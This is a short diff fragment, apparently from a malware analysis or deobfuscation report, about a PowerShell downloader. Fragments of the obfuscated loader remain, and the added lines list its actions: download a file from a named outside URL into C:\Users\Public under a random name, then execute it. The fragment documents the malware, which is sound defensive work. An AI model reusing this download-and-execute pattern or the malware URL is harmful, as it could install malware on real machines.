@@ -56,6 +56,9 @@ ricajoy.com/wef346645'.Split(',');$karapas = $nsadasd.next(1, 343245);$huas = $e
 -Item($huas);break;}catch{write-host $_.Exception.Message;}}
 
 
-############################## Layer 5 ##############################
-C:\Users\Public\190597.exe
+############################## Actions ##############################
+1. [System.Random] Generate random integer between 1 and 343245 . Value returned: 92672
+2. [System.Net.WebClient.DownloadFile] Download from: http://smart-soft.pl/wef346645
+3. [System.Net.WebClient.DownloadFile] Save downloaded file to: C:\Users\Public\92672.exe
+4. [Invoke-Item] Execute/Open: C:\Users\Public\92672.exe
 ```
